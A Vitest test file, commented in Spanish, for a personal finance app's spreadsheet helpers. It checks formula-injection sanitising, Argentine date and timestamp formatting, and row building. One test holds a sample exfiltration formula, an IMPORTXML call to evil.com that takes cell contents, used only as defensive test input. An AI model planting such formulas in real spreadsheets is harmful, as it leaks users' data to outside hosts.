import { describe, it, expect } from "vitest";
import { sanitizeCell, formatTimestampAR, isoToFechaAR, movimientoToRow } from "@/lib/sheet-format";
import type { Movimiento } from "@/types";

// sanitizeCell es una defensa de SEGURIDAD (inyección de fórmulas en Sheets/Excel): si el
// usuario escribe "=IMPORTXML(...)" en una descripción, el sheet lo ejecutaría como fórmula.
// La auditoría marcó las rules como "validan quién pero no la forma" — esta es la última
// barrera antes de que texto del usuario llegue a una planilla.

describe("sanitizeCell (anti-inyección de fórmulas)", () => {
  it("neutraliza los prefijos peligrosos con apóstrofo", () => {
    expect(sanitizeCell("=1+1")).toBe("'=1+1");
    expect(sanitizeCell("+A1")).toBe("'+A1");
    expect(sanitizeCell("-A1")).toBe("'-A1");
    expect(sanitizeCell("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("neutraliza tab y CR al inicio (vectores menos obvios)", () => {
    expect(sanitizeCell("\t=1+1")).toBe("'\t=1+1");
    expect(sanitizeCell("\r=1+1")).toBe("'\r=1+1");
  });

  it("caso real: fórmula de exfiltración en una descripción", () => {
    const ataque = '=IMPORTXML(CONCAT("http://evil.com/?d=",A1),"//a")';
    expect(sanitizeCell(ataque)).toBe(`'${ataque}`);
  });

  it("deja intacto el texto normal", () => {
    expect(sanitizeCell("Nafta")).toBe("Nafta");
    expect(sanitizeCell("Café 3x2")).toBe("Café 3x2");
  });

  it("los números pasan sin tocar (no se convierten en texto)", () => {
    expect(sanitizeCell(1500)).toBe(1500);
    expect(sanitizeCell(-1500)).toBe(-1500); // negativo numérico ≠ string "-A1"
  });
});

describe("isoToFechaAR", () => {
  it("YYYY-MM-DD → D/M/YYYY sin ceros a la izquierda", () => {
    expect(isoToFechaAR("2026-07-05")).toBe("5/7/2026");
    expect(isoToFechaAR("2026-12-25")).toBe("25/12/2026");
  });

  it("tolera vacío o formato inesperado sin romper el sync", () => {
    expect(isoToFechaAR("")).toBe("");
    expect(isoToFechaAR("basura")).toBe("basura");
  });
});

describe("formatTimestampAR", () => {
  it("convierte UTC a AR (UTC-3)", () => {
    // 2026-07-18T12:00:00Z → 09:00 en AR
    expect(formatTimestampAR(new Date("2026-07-18T12:00:00Z"))).toBe("18/7/2026 9:00:00");
  });

  it("cruza el día hacia atrás cuando es de madrugada UTC", () => {
    // 2026-07-18T01:30:00Z → 22:30 del 17 en AR
    expect(formatTimestampAR(new Date("2026-07-18T01:30:00Z"))).toBe("17/7/2026 22:30:00");
  });

  it("la hora va sin padding pero minutos y segundos con padding", () => {
    expect(formatTimestampAR(new Date("2026-07-18T12:05:03Z"))).toBe("18/7/2026 9:05:03");
  });
});

describe("movimientoToRow", () => {
  const m: Movimiento = {
    id: "abc", timestampCarga: new Date("2026-07-18T12:00:00Z"), fecha: "2026-07-18",
    tipo: "Gasto", categoria: "Auto", descripcion: "Nafta", monto: 15000,
    medioPago: "Débito", observaciones: "ruta", periodoId: "1/7/2026", userId: "u",
  };

  it("arma la fila en el orden de columnas del sheet", () => {
    expect(movimientoToRow(m)).toEqual([
      "18/7/2026 9:00:00", "18/7/2026", "Gasto", "Auto", "Nafta", 15000, "Débito", "ruta", "1/7/2026",
    ]);
  });

  it("el monto viaja como NÚMERO (para que el sheet pueda sumarlo)", () => {
    expect(typeof movimientoToRow(m)[5]).toBe("number");
  });

  it("sanitiza los campos de texto libres del usuario", () => {
    const row = movimientoToRow({ ...m, descripcion: "=HYPERLINK(1)", observaciones: "@x" });
    expect(row[4]).toBe("'=HYPERLINK(1)");
    expect(row[7]).toBe("'@x");
  });

  it("campos opcionales ausentes → celda vacía, no 'undefined'", () => {
    // Datos viejos del Google Form pueden no traer estos campos, aunque el tipo los declare.
    const { descripcion, medioPago, observaciones, ...sinOpcionales } = m;
    const row = movimientoToRow(sinOpcionales as Movimiento);
    expect(row[4]).toBe("");
    expect(row[6]).toBe("");
    expect(row[7]).toBe("");
  });
});
